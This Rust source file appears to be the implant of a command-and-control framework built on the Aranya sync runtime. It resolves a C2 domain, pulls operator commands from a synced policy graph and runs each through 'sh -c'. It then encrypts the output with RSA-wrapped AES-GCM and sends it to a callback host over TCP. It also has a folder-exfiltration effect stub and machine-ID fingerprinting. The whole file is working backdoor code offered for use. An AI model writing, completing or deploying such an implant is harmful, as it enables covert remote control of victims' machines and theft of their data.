mod common;
mod config;
mod policy;
mod c2syncer;

use std::{
    net::{
        SocketAddr,
        TcpStream,
        IpAddr,
        Ipv4Addr
    },
    sync::Arc,
    path::{Path, PathBuf},
    fs,
    io::Write,
    str::FromStr
};
use aes::{Aes256, cipher::{KeyInit, generic_array::GenericArray}};
use aes_gcm::{AeadCore, Aes256Gcm, aead::Aead};
use aranya_policy_ifgen::Actionable;
use aranya_runtime::{storage::GraphId, Sink, VmEffect};
use aranya_crypto::{Csprng, Rng};
use machine_uid::machine_id;
use rsa::{BigUint, Oaep, RsaPublicKey, sha2::Sha256};
use tokio::time::{Duration, sleep};
use crate::{c2syncer::{C2Syncer, c2sync, new_quic_client, run_c2syncer}, common::{Aes256ShareMessage, C2Client, CommandExecutionMessage, FastChannelMessage}, policy::{Effect, get_owner_key}};
use tokio::sync::Mutex;
use rand::{RngExt, seq::IndexedRandom};

struct C2Sink {
    pub commands: Vec<String>,
    pub callback: Option<String>,
    // Owners current public key (n, e)
    pub n: Vec<u8>,
    pub e: Vec<u8>
}

impl C2Sink {
    pub fn new() -> Self {
        Self {
            commands: Vec::new(),
            callback: None,
            n: Vec::new(),
            e: Vec::new()
        }
    }
}

impl Sink<VmEffect> for C2Sink {
    fn begin(&mut self) {
        // NOTE: No operation
    }

    fn commit(&mut self) {
        // NOTE: No operation
    }

    fn consume(&mut self, effect: VmEffect) {
        let Ok(eff) = Effect::try_from(effect) else {
            return;
        };

        match eff {
            Effect::Command(cmd) => {
                self.commands.push(cmd.cmdline.trim().to_string());
            },
            Effect::QueryOwnerKeyResult(key) => {
                self.n = key.n;
                self.e = key.e;
            },
            Effect::ExfiltrateFoldersEffect(folders) => {
                // TODO: This
            },
            Effect::UpdateCallbackC2Effect(callback) => {
                self.callback = Some(callback.address.to_string());
            },
            _ => {}
        }
    }

    fn rollback(&mut self) {
        // NOTE: No operation
    }
}

fn generate_random_directory() -> PathBuf {
    let mut randdir = [0u8; 10];

    let mut rng = rand::rng();
    for i in 0..10 {
        randdir[i] = rng.sample(rand::distr::Alphanumeric);
    }

    return std::env::temp_dir()
        .join(Path::new(std::str::from_utf8(&randdir).unwrap()));
}

fn main() {
    // Enable logging to terminal 
    tracing_subscriber::fmt().init();

    let args: Vec<String> = std::env::args().collect();
    let bind: SocketAddr = match args.len() {
        1 => {
            SocketAddr::new(IpAddr::V4(Ipv4Addr::new(0, 0, 0, 0)), config::PORT)
        },
        _ => {
            args[1].parse()
                .expect("IPv4 address in wrong format i.e. 127.0.0.1:1234")
        }
    };

    // Generate random directory
    let basedir = generate_random_directory().to_path_buf();

    let _ = fs::create_dir(&basedir);

    let sink = C2Sink::new();

    let mut aranya = C2Client::new(basedir);
    let keys = aranya.create_new_keys();
    let deviceid = keys.ident_key.id().unwrap();
    let policy = aranya.create_policy(config::POLICY, deviceid).expect("Failed to create policy");
    let cs = aranya.init_aranya(policy);

    // let graph = GraphId::from_bytes(config::GRAPH_BIN.try_into().unwrap());
    let graph = GraphId::from_str("FxoQd2k4TCugs8u38utki1PBkhspw9dVdwyTbWLzA8b6").unwrap();
    aranya.set_graph(graph);

    let mut syncer = C2Syncer::new(cs, sink);

    let ips: Vec<std::net::IpAddr> =
        dns_lookup::lookup_host(config::DOMAIN).unwrap().collect();

    for host in &ips {
        syncer.connections.push(
            SocketAddr::new(*host, config::PORT)
        );
    }

    // Create new async runtime for the Aranya syncer.
    //   It needs a lot of stack memory
    let rt = tokio::runtime::Builder::new_multi_thread()
        .thread_stack_size(100 * 1024 * 1024)
        .enable_all()
        .build()
        .unwrap();

    rt.block_on(async move {
        let quic = {
            let mut syncbind = bind.clone();
            syncbind.set_port(4446);
            Arc::new(new_quic_client(syncbind))
        };

        let syncer = Arc::new(Mutex::new(syncer));

        tokio::spawn(
            run_c2syncer(
                Arc::clone(&syncer),
                Arc::clone(&quic),
                bind
            )
        );

        // TODO: LOL i mean, it takes like 10 tries for it to 'parse peers' idk
        for i in 1..10 {
            for ip in &ips {
                c2sync(
                    SocketAddr::new(*ip, config::PORT),
                    Arc::clone(&quic),
                    Arc::clone(&syncer),
                    graph
                ).await;
            }
        }
        
        let machineid = match machine_id::get_machine_id() {
            Ok(v) if v.len() > 0 => v,
            _ => {
                let mut bytes = [0u8; 16];
                aranya_crypto::Rng.fill_bytes(&mut bytes);
                hex::encode(bytes)
            }
        };

        loop {
            sleep(Duration::from_millis(1000)).await;

            let commands =  {
                let syncer = &mut *syncer.lock().await;
                let commands = syncer.sink.commands.clone();
                syncer.sink.commands.clear();

                commands
            };

            println!("Commands: {commands:?}");

            for cmd in commands {
                // TODO: Check for other shells?
                let out = std::process::Command::new("sh")
                    .args(["-c", &cmd])
                    .output()
                    .expect("command error");

                let syncer = &mut *syncer.lock().await;
                let sink = &mut syncer.sink;

                let Ok(info) = aranya.get_latest_information(&mut syncer.clientstate) else {
                    continue;
                };

                println!("{:?}", info.callback);
                println!("{:?}", info.pubkey);

                let Some(callback) = info.callback else {
                    continue;
                };

                let Some(ownerkey) = info.pubkey else {
                    continue;
                };

                let key = Aes256Gcm::generate_key(Rng);
                let nonce = Aes256Gcm::generate_nonce(Rng);
                let aes = Aes256Gcm::new(&key);

                let share = Aes256ShareMessage {
                    key: key.into(),
                    nonce: nonce.into(),
                    machine_id: machineid.to_string()
                };

                println!("{:?}", share.nonce);
                println!("{:?}", share.key);

                let command = CommandExecutionMessage::CommandExecuted {
                    stdout: out.stdout.to_vec(),
                    stderr: out.stderr.to_vec()
                };

                let mut rng = Rng;
                let message = FastChannelMessage {
                    share: ownerkey.encrypt(
                        &mut rng,
                        Oaep::new::<Sha256>(),
                        &postcard::to_allocvec(&share)
                            .expect("Could not serialise share")
                        ).expect("Failed to encrypt"),
                    command: aes
                        .encrypt(&nonce, postcard::to_allocvec(&command)
                        .expect("Could not serialise share").as_slice())
                        .expect("Could not encrypt message")
                };

                let Some(ref callback) = sink.callback else {
                    continue;
                };

                // TODO: Can cause unecessary blocking ?
                let Ok(mut stream) = TcpStream::connect(callback) else {
                    println!("Failed to connect to callback");
                    continue;
                };

                let data = postcard::to_allocvec(&message)
                    .expect("Could not serialise message");

                stream.write(&data);
            }
        }
    });
}
